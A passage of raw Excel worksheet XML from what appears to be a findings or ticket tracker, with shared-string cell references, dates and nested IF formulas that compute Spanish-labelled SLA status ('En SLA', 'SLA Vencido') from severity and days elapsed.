      <c r="V599" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W599" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB599" t="s">
        <v>1975</v>
      </c>
      <c r="AD599" t="s">
        <v>1976</v>
      </c>
      <c r="AE599" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG599" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="600" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A600" s="84">
        <v>599</v>
      </c>
      <c r="B600" t="s">
        <v>32</v>
      </c>
      <c r="C600" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D600" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G600" t="s">
        <v>3501</v>
      </c>
      <c r="H600" t="s">
        <v>3552</v>
      </c>
      <c r="J600" t="s">
        <v>1490</v>
      </c>
      <c r="L600" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M600" t="s">
        <v>522</v>
      </c>
      <c r="Q600" t="s">
        <v>3581</v>
      </c>
      <c r="T600" s="1">
        <v>46100</v>
      </c>
      <c r="U600" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V600" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W600" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB600" t="s">
        <v>1975</v>
      </c>
      <c r="AD600" t="s">
        <v>1976</v>
      </c>
      <c r="AE600" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG600" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="601" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A601" s="84">
        <v>600</v>
      </c>
      <c r="B601" t="s">
        <v>32</v>
      </c>
      <c r="C601" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D601" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G601" t="s">
        <v>3501</v>
      </c>
      <c r="H601" t="s">
        <v>3549</v>
      </c>
      <c r="J601" t="s">
        <v>1490</v>
      </c>
      <c r="L601" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M601" t="s">
        <v>522</v>
      </c>
      <c r="Q601" t="s">
        <v>3583</v>
      </c>
      <c r="T601" s="1">
        <v>46100</v>
      </c>
      <c r="U601" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V601" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W601" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB601" t="s">
        <v>1975</v>
      </c>
      <c r="AD601" t="s">
        <v>1976</v>
      </c>
      <c r="AE601" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG601" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="602" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A602" s="84">
        <v>601</v>
      </c>
      <c r="B602" t="s">
        <v>32</v>
      </c>
      <c r="C602" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D602" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G602" t="s">
        <v>1323</v>
      </c>
      <c r="H602" t="s">
        <v>3558</v>
      </c>
      <c r="J602" t="s">
        <v>3473</v>
      </c>
      <c r="L602" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M602" t="s">
        <v>522</v>
      </c>
      <c r="Q602" t="s">
        <v>1391</v>
      </c>
      <c r="T602" s="1">
        <v>46115</v>
      </c>
      <c r="U602" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>94</v>
      </c>
      <c r="V602" s="1">
        <f t="shared" si="51"/>
        <v>46145</v>
      </c>
      <c r="W602" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB602" t="s">
        <v>3478</v>
      </c>
      <c r="AD602" t="s">
        <v>3479</v>
      </c>
      <c r="AE602" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG602" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="603" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A603" s="84">
        <v>602</v>
      </c>
      <c r="B603" t="s">
        <v>32</v>
      </c>
      <c r="C603" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D603" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G603" t="s">
        <v>3519</v>
      </c>
      <c r="H603" t="s">
        <v>3547</v>
      </c>
      <c r="J603" t="s">
        <v>1490</v>
      </c>
      <c r="L603" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M603" t="s">
        <v>522</v>
      </c>
      <c r="Q603" t="s">
        <v>3590</v>
      </c>
      <c r="T603" s="1">
        <v>46132</v>
      </c>
      <c r="U603" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>77</v>
      </c>
      <c r="V603" s="1">
        <f t="shared" si="51"/>
        <v>46162</v>
      </c>
      <c r="W603" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB603" t="s">
        <v>1975</v>
      </c>
      <c r="AD603" t="s">
        <v>1976</v>
      </c>
      <c r="AE603" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG603" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="604" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A604" s="84">
        <v>603</v>
      </c>
      <c r="B604" t="s">
        <v>32</v>
      </c>
      <c r="C604" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D604" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G604" t="s">
        <v>1323</v>
      </c>
      <c r="H604" t="s">
        <v>3556</v>
      </c>
      <c r="J604" t="s">
        <v>1844</v>
      </c>
      <c r="L604" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M604" t="s">
        <v>522</v>
      </c>
      <c r="Q604" t="s">
        <v>1391</v>
      </c>
      <c r="T604" s="1">
        <v>46115</v>
      </c>
      <c r="U604" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>94</v>
      </c>
      <c r="V604" s="1">
        <f t="shared" si="51"/>
        <v>46145</v>
      </c>
      <c r="W604" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB604" t="s">
        <v>3477</v>
      </c>
      <c r="AD604" t="s">
        <v>3479</v>
      </c>
      <c r="AE604" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG604" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="605" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A605" s="84">
        <v>604</v>
      </c>
      <c r="B605" t="s">
        <v>32</v>
      </c>
      <c r="C605" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D605" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G605" t="s">
        <v>3625</v>
      </c>
      <c r="I605" t="s">
        <v>3626</v>
      </c>
      <c r="J605" t="s">
        <v>1186</v>
      </c>
      <c r="L605" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M605" t="s">
        <v>111</v>
      </c>
      <c r="Q605" t="s">
        <v>3628</v>
      </c>
      <c r="T605" s="1">
        <v>46113</v>
      </c>
      <c r="U605" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>96</v>
      </c>
      <c r="V605" s="1">
        <f t="shared" si="51"/>
        <v>46233</v>
      </c>
      <c r="W605" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>En SLA</v>
      </c>
      <c r="AB605" s="65" t="s">
        <v>3629</v>
      </c>
      <c r="AC605" s="65" t="s">
        <v>3103</v>
      </c>
      <c r="AD605" s="65" t="s">
        <v>3630</v>
      </c>
      <c r="AE605" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="606" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A606" s="84">
        <v>605</v>
      </c>
      <c r="B606" t="s">
        <v>32</v>
      </c>
      <c r="C606" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D606" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G606" t="s">
        <v>3625</v>
      </c>
      <c r="I606" t="s">
        <v>3627</v>
      </c>
      <c r="J606" t="s">
        <v>1192</v>
      </c>
      <c r="L606" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M606" t="s">
        <v>111</v>
      </c>
      <c r="Q606" t="s">
        <v>3628</v>
      </c>
      <c r="T606" s="1">
        <v>46113</v>
      </c>
      <c r="U606" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>96</v>
      </c>
      <c r="V606" s="1">
        <f t="shared" si="51"/>
        <v>46233</v>
      </c>
      <c r="W606" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>En SLA</v>
      </c>
      <c r="AB606" s="65" t="s">
        <v>3631</v>
      </c>
      <c r="AC606" s="65" t="s">
        <v>3632</v>
      </c>
      <c r="AD606" s="65" t="s">
        <v>3108</v>
      </c>
      <c r="AE606" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="607" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A607" s="84">
        <v>606</v>
      </c>
      <c r="B607" t="s">
        <v>32</v>
      </c>
      <c r="C607" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D607" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G607" t="s">
        <v>1203</v>
      </c>
      <c r="I607" t="s">
        <v>3633</v>
      </c>
      <c r="J607" t="s">
        <v>3123</v>
      </c>
      <c r="L607" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M607" t="s">
        <v>111</v>
      </c>
      <c r="Q607" t="s">
        <v>3634</v>
      </c>
      <c r="T607" s="1">
        <v>46113</v>
      </c>
      <c r="U607" s="76">
        <f t="shared" ref="U607:U608" ca="1" si="56">TODAY()-T607</f>
        <v>96</v>
      </c>
      <c r="V607" s="1">
        <f t="shared" ref="V607:V608" si="57">IF(M607="Critical",T607+10,IF(M607="High",T607+30,IF(M607="Bad",T607+30,IF(M607="Medium",T607+90,IF(M607="Warm",T607+90,IF(M607="Low",T607+120,IF(M607="Fair",T607+120,IF(M607="Neutral",T607+120,""))))))))</f>
        <v>46233</v>
      </c>
      <c r="W607" s="76" t="str">
        <f t="shared" ref="W607:W608" ca="1" si="58">IF(M607="Critical",IF(U607&gt;10,"SLA Vencido","En SLA"),IF(M607="High",IF(U607&gt;30,"SLA Vencido","En SLA"),IF(M607="Bad",IF(U607&gt;30,"SLA Vencido","En SLA"),IF(M607="Medium",IF(U607&gt;90,"SLA Vencido","En SLA"),IF(M607="Warm",IF(U607&gt;90,"SLA Vencido","En SLA"),IF(M607="Low",IF(U607&gt;120,"SLA Vencido","En SLA"),IF(M607="Fair",IF(U607&gt;120,"SLA Vencido","En SLA"),IF(M607="Neutral",IF(U607&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB607" s="65" t="s">
        <v>3635</v>
      </c>
      <c r="AC607" s="65" t="s">
        <v>3637</v>
      </c>
      <c r="AD607" s="65" t="s">
        <v>3636</v>
      </c>
      <c r="AE607" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG607" s="65" t="s">
        <v>3638</v>
      </c>
    </row>
    <row r="608" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A608" s="84">
        <v>607</v>
      </c>
      <c r="B608" t="s">
        <v>32</v>
      </c>
      <c r="C608" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D608" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G608" t="s">
        <v>1816</v>
      </c>
      <c r="I608" t="s">
        <v>3639</v>
      </c>
      <c r="J608" t="s">
        <v>3641</v>
      </c>
      <c r="L608" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M608" t="s">
        <v>522</v>
      </c>
      <c r="Q608" s="87" t="s">
        <v>3643</v>
      </c>
      <c r="T608" s="1">
        <v>46129</v>
      </c>
      <c r="U608" s="76">
        <f t="shared" ca="1" si="56"/>
        <v>80</v>
      </c>
      <c r="V608" s="1">
        <f t="shared" si="57"/>
        <v>46159</v>
      </c>
      <c r="W608" s="76" t="str">
        <f t="shared" ca="1" si="58"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB608" s="65" t="s">
        <v>3646</v>
      </c>
      <c r="AC608" s="65" t="s">
        <v>3648</v>
      </c>
      <c r="AD608" s="65" t="s">
        <v>3647</v>
      </c>
      <c r="AE608" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG608" s="65" t="s">
        <v>3239</v>
      </c>
    </row>
    <row r="609" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A609" s="84">
        <v>608</v>
      </c>
      <c r="B609" t="s">
        <v>32</v>
      </c>
      <c r="C609" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D609" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G609" t="s">
        <v>1816</v>
      </c>
      <c r="I609" t="s">
        <v>3640</v>
      </c>
      <c r="J609" t="s">
        <v>3642</v>
      </c>
      <c r="L609" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M609" t="s">
        <v>42</v>
      </c>
      <c r="Q609" t="s">
        <v>3644</v>
      </c>
      <c r="T609" s="1">
        <v>46129</v>
      </c>
      <c r="U609" s="76">
        <f t="shared" ref="U609:U615" ca="1" si="59">TODAY()-T609</f>
        <v>80</v>
      </c>
      <c r="V609" s="1">
        <f t="shared" ref="V609:V615" si="60">IF(M609="Critical",T609+10,IF(M609="High",T609+30,IF(M609="Bad",T609+30,IF(M609="Medium",T609+90,IF(M609="Warm",T609+90,IF(M609="Low",T609+120,IF(M609="Fair",T609+120,IF(M609="Neutral",T609+120,""))))))))</f>
        <v>46139</v>
      </c>
      <c r="W609" s="76" t="str">
        <f t="shared" ref="W609:W615" ca="1" si="61">IF(M609="Critical",IF(U609&gt;10,"SLA Vencido","En SLA"),IF(M609="High",IF(U609&gt;30,"SLA Vencido","En SLA"),IF(M609="Bad",IF(U609&gt;30,"SLA Vencido","En SLA"),IF(M609="Medium",IF(U609&gt;90,"SLA Vencido","En SLA"),IF(M609="Warm",IF(U609&gt;90,"SLA Vencido","En SLA"),IF(M609="Low",IF(U609&gt;120,"SLA Vencido","En SLA"),IF(M609="Fair",IF(U609&gt;120,"SLA Vencido","En SLA"),IF(M609="Neutral",IF(U609&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB609" s="65" t="s">
        <v>3645</v>
      </c>
      <c r="AC609" s="65" t="s">
        <v>3650</v>
      </c>
      <c r="AD609" s="65" t="s">
        <v>3649</v>
      </c>
      <c r="AE609" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG609" s="65" t="s">
        <v>3239</v>
      </c>
    </row>
    <row r="610" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A610" s="84">
        <v>609</v>
      </c>
      <c r="B610" t="s">
        <v>32</v>
      </c>
      <c r="C610" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D610" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G610" t="s">
        <v>1302</v>
      </c>
      <c r="I610" t="s">
        <v>3652</v>
      </c>
      <c r="J610" t="s">
        <v>3653</v>
      </c>
      <c r="L610" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M610" t="s">
        <v>522</v>
      </c>
      <c r="Q610" t="s">
        <v>3654</v>
      </c>
      <c r="T610" s="1">
        <v>46132</v>
      </c>
      <c r="U610" s="76">
        <f t="shared" ca="1" si="59"/>
        <v>77</v>
      </c>
      <c r="V610" s="1">
        <f t="shared" si="60"/>
        <v>46162</v>
      </c>
      <c r="W610" s="76" t="str">
        <f t="shared" ca="1" si="61"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB610" s="65" t="s">
        <v>3655</v>
      </c>
      <c r="AC610" s="65" t="s">
        <v>3657</v>
      </c>
      <c r="AD610" s="65" t="s">
        <v>3656</v>
      </c>
      <c r="AE610" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG610" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="611" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A611" s="84">
        <v>610</v>
      </c>
      <c r="B611" t="s">
        <v>32</v>
      </c>
      <c r="C611" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D611" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G611" t="s">
        <v>3454</v>
      </c>
      <c r="H611" t="s">
        <v>3658</v>
      </c>
      <c r="J611" t="s">
        <v>574</v>
      </c>
      <c r="L611" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M611" s="63" t="s">
        <v>61</v>
      </c>
      <c r="Q611" t="s">
        <v>3661</v>
      </c>
      <c r="T611" s="1">
        <v>46132</v>
      </c>
      <c r="U611" s="76">
        <f t="shared" ca="1" si="59"/>
        <v>77</v>
      </c>
      <c r="V611" s="1">
        <f t="shared" si="60"/>
        <v>46222</v>
      </c>
      <c r="W611" s="76" t="str">
        <f t="shared" ca="1" si="61"/>
        <v>En SLA</v>
      </c>
      <c r="AB611" t="s">
        <v>1893</v>
      </c>
      <c r="AC611" t="s">
        <v>1790</v>
      </c>
      <c r="AE611" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG611" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="612" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A612" s="84">
        <v>611</v>
      </c>
      <c r="B612" t="s">
        <v>32</v>
      </c>
      <c r="C612" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D612" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G612" t="s">
        <v>3660</v>
      </c>
      <c r="H612" t="s">
        <v>3659</v>
      </c>
      <c r="J612" t="s">
        <v>574</v>
      </c>
      <c r="L612" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M612" s="63" t="s">
        <v>61</v>
      </c>
      <c r="Q612" t="s">
        <v>3662</v>
      </c>
      <c r="T612" s="1">
        <v>46132</v>
      </c>
      <c r="U612" s="76">
        <f t="shared" ca="1" si="59"/>
        <v>77</v>
      </c>
      <c r="V612" s="1">
        <f t="shared" si="60"/>
        <v>46222</v>
      </c>
      <c r="W612" s="76" t="str">
        <f t="shared" ca="1" si="61"/>
        <v>En SLA</v>
      </c>
      <c r="AB612" t="s">
        <v>1893</v>
      </c>
      <c r="AC612" t="s">
        <v>1790</v>
      </c>
      <c r="AE612" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG612" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="613" spans="1:33" s="88" customFormat="1" ht="409.5" x14ac:dyDescent="0.35">
      <c r="A613" s="84">
        <v>612</v>
      </c>
      <c r="B613" s="88" t="s">
        <v>32</v>
      </c>
      <c r="C613" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D613" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G613" s="88" t="s">
        <v>3678</v>
      </c>
      <c r="H613" s="88" t="s">
        <v>3677</v>
      </c>
      <c r="I613" s="88" t="s">
        <v>3676</v>
      </c>
      <c r="J613" s="74" t="s">
        <v>870</v>
      </c>
      <c r="L613" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M613" s="88" t="s">
        <v>61</v>
      </c>
      <c r="N613" s="88">
        <v>4.2</v>
      </c>
      <c r="Q613" s="88" t="s">
        <v>3679</v>
      </c>
      <c r="T613" s="89">
        <v>46134</v>
      </c>
      <c r="U613" s="56">
        <f t="shared" ca="1" si="59"/>
        <v>75</v>
      </c>
      <c r="V613" s="89">
        <f t="shared" si="60"/>
        <v>46224</v>
      </c>
      <c r="W613" s="56" t="str">
        <f t="shared" ca="1" si="61"/>
        <v>En SLA</v>
      </c>
      <c r="AB613" s="90" t="s">
        <v>3680</v>
      </c>
      <c r="AC613" s="90" t="s">
        <v>3681</v>
      </c>
      <c r="AD613" s="90" t="s">
        <v>3053</v>
      </c>
      <c r="AE613" s="90" t="s">
        <v>1987</v>
      </c>
      <c r="AG613" s="88" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="614" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A614" s="84">
        <v>613</v>
      </c>
      <c r="B614" t="s">
        <v>32</v>
      </c>
      <c r="C614" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D614" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G614" t="s">
        <v>1539</v>
      </c>
      <c r="H614" t="s">
        <v>3682</v>
      </c>
      <c r="I614" t="s">
        <v>3683</v>
      </c>
      <c r="J614" t="s">
        <v>3684</v>
      </c>
      <c r="L614" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M614" t="s">
        <v>61</v>
      </c>
      <c r="N614">
        <v>5.3</v>
      </c>
      <c r="Q614" t="s">
        <v>3234</v>
      </c>
      <c r="T614" s="1">
        <v>46135</v>
      </c>
      <c r="U614" s="76">
        <f t="shared" ca="1" si="59"/>
        <v>74</v>
      </c>
      <c r="V614" s="1">
        <f t="shared" si="60"/>
        <v>46225</v>
      </c>
      <c r="W614" s="76" t="str">
        <f t="shared" ca="1" si="61"/>
        <v>En SLA</v>
      </c>
      <c r="AB614" s="65" t="s">
        <v>3685</v>
      </c>
      <c r="AC614" s="65" t="s">
        <v>1972</v>
      </c>
      <c r="AD614" s="65" t="s">
        <v>1959</v>
      </c>
      <c r="AE614" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG614" s="65" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="615" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A615" s="84">
        <v>614</v>
      </c>
      <c r="B615" t="s">
        <v>32</v>
      </c>
      <c r="C615" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D615" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G615" t="s">
        <v>1302</v>
      </c>
      <c r="I615" t="s">
        <v>3690</v>
      </c>
      <c r="J615" s="65" t="s">
        <v>3694</v>
      </c>
      <c r="L615" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M615" t="s">
        <v>61</v>
      </c>
      <c r="N615" t="s">
        <v>1580</v>
      </c>
      <c r="Q615" t="s">
        <v>3698</v>
      </c>
      <c r="T615" s="1">
        <v>46139</v>
      </c>
      <c r="U615" s="76">
        <f t="shared" ca="1" si="59"/>
        <v>70</v>
      </c>
      <c r="V615" s="1">
        <f t="shared" si="60"/>
        <v>46229</v>
      </c>
      <c r="W615" s="76" t="str">
        <f t="shared" ca="1" si="61"/>
        <v>En SLA</v>
      </c>
      <c r="AB615" s="65" t="s">
        <v>3699</v>
      </c>
      <c r="AC615" s="65" t="s">
        <v>3701</v>
      </c>
      <c r="AD615" s="65" t="s">
        <v>3700</v>
      </c>
      <c r="AE615" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG615" s="65" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="616" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A616" s="84">
        <v>615</v>
      </c>
      <c r="B616" t="s">
        <v>32</v>
      </c>
      <c r="C616" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D616" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G616" t="s">
        <v>1302</v>
      </c>
      <c r="I616" t="s">
        <v>3691</v>
      </c>
      <c r="J616" t="s">
        <v>3695</v>
      </c>
      <c r="L616" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M616" t="s">
        <v>61</v>
      </c>
      <c r="Q616" t="s">
        <v>3698</v>
      </c>
      <c r="T616" s="1">
        <v>46139</v>
      </c>
      <c r="U616" s="76">
        <f t="shared" ref="U616:U621" ca="1" si="62">TODAY()-T616</f>
        <v>70</v>
      </c>
      <c r="V616" s="1">
        <f t="shared" ref="V616:V621" si="63">IF(M615="Critical",T616+10,IF(M615="High",T616+30,IF(M615="Bad",T616+30,IF(M615="Medium",T616+90,IF(M615="Warm",T616+90,IF(M615="Low",T616+120,IF(M615="Fair",T616+120,IF(M615="Neutral",T616+120,""))))))))</f>
        <v>46229</v>
      </c>
      <c r="W616" s="76" t="str">
        <f t="shared" ref="W616:W621" ca="1" si="64">IF(M615="Critical",IF(U616&gt;10,"SLA Vencido","En SLA"),IF(M615="High",IF(U616&gt;30,"SLA Vencido","En SLA"),IF(M615="Bad",IF(U616&gt;30,"SLA Vencido","En SLA"),IF(M615="Medium",IF(U616&gt;90,"SLA Vencido","En SLA"),IF(M615="Warm",IF(U616&gt;90,"SLA Vencido","En SLA"),IF(M615="Low",IF(U616&gt;120,"SLA Vencido","En SLA"),IF(M615="Fair",IF(U616&gt;120,"SLA Vencido","En SLA"),IF(M615="Neutral",IF(U616&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB616" s="65" t="s">
        <v>3702</v>
      </c>
      <c r="AC616" s="65" t="s">
        <v>3704</v>
      </c>
      <c r="AD616" s="65" t="s">
        <v>3703</v>
      </c>
      <c r="AE616" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG616" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="617" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A617" s="84">
        <v>616</v>
      </c>
      <c r="B617" t="s">
        <v>32</v>
      </c>
      <c r="C617" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D617" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G617" t="s">
        <v>1302</v>
      </c>
      <c r="I617" t="s">
        <v>3692</v>
      </c>
      <c r="J617" t="s">
        <v>3696</v>
      </c>
      <c r="L617" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M617" t="s">
        <v>111</v>
      </c>
      <c r="Q617" t="s">
        <v>3698</v>
      </c>
      <c r="T617" s="1">
        <v>46139</v>
      </c>
      <c r="U617" s="76">
        <f t="shared" ca="1" si="62"/>
        <v>70</v>
      </c>
      <c r="V617" s="1">
        <f t="shared" si="63"/>
        <v>46229</v>
      </c>
      <c r="W617" s="76" t="str">
        <f t="shared" ca="1" si="64"/>
        <v>En SLA</v>
      </c>
      <c r="AB617" s="65" t="s">
        <v>3705</v>
      </c>
      <c r="AC617" s="65" t="s">
        <v>3707</v>
      </c>
      <c r="AD617" s="65" t="s">
        <v>3706</v>
      </c>
      <c r="AE617" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG617" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="618" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A618" s="84">
        <v>617</v>
      </c>
      <c r="B618" t="s">
        <v>32</v>
      </c>
      <c r="C618" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D618" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G618" t="s">
        <v>1302</v>
      </c>
      <c r="I618" t="s">
        <v>3693</v>
      </c>
      <c r="J618" t="s">
        <v>3697</v>
      </c>
      <c r="L618" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M618" t="s">
        <v>111</v>
      </c>
      <c r="Q618" t="s">
        <v>3698</v>
      </c>
      <c r="T618" s="1">
        <v>46139</v>
      </c>
      <c r="U618" s="76">
        <f t="shared" ca="1" si="62"/>
        <v>70</v>
      </c>
      <c r="V618" s="1">
        <f t="shared" si="63"/>
        <v>46259</v>
      </c>
      <c r="W618" s="76" t="str">
        <f t="shared" ca="1" si="64"/>
        <v>En SLA</v>
      </c>
      <c r="AB618" s="65" t="s">
        <v>3708</v>
      </c>
      <c r="AC618" s="65" t="s">
        <v>3710</v>
      </c>
      <c r="AD618" s="65" t="s">
        <v>3709</v>
      </c>
      <c r="AE618" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG618" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="619" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A619" s="84">
        <v>618</v>
      </c>
      <c r="B619" t="s">
        <v>32</v>
      </c>
      <c r="C619" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D619" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G619" t="s">
        <v>1816</v>
      </c>
      <c r="I619" t="s">
        <v>3711</v>
      </c>
      <c r="J619" t="s">
        <v>3714</v>
      </c>
      <c r="L619" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M619" t="s">
        <v>61</v>
      </c>
      <c r="Q619" s="65" t="s">
        <v>3717</v>
      </c>
      <c r="T619" s="1">
        <v>46142</v>
      </c>
      <c r="U619" s="76">
        <f t="shared" ca="1" si="62"/>
        <v>67</v>
      </c>
      <c r="V619" s="1">
        <f t="shared" si="63"/>
        <v>46262</v>
      </c>
      <c r="W619" s="76" t="str">
        <f t="shared" ca="1" si="64"/>
        <v>En SLA</v>
      </c>
      <c r="AB619" s="65" t="s">
        <v>3718</v>
      </c>
      <c r="AC619" s="65" t="s">
        <v>3720</v>
      </c>
      <c r="AD619" s="65" t="s">
        <v>3719</v>
      </c>
    </row>
    <row r="620" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A620" s="84">
        <v>619</v>
      </c>
      <c r="B620" t="s">
        <v>32</v>
      </c>
      <c r="C620" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D620" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G620" t="s">
        <v>1816</v>
      </c>
      <c r="I620" t="s">
        <v>3712</v>
      </c>
      <c r="J620" s="65" t="s">
        <v>3715</v>
      </c>
      <c r="L620" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M620" t="s">
        <v>61</v>
      </c>
      <c r="Q620" s="65" t="s">
        <v>3725</v>
      </c>
      <c r="T620" s="1">
        <v>46142</v>
      </c>
      <c r="U620" s="76">
        <f t="shared" ca="1" si="62"/>
        <v>67</v>
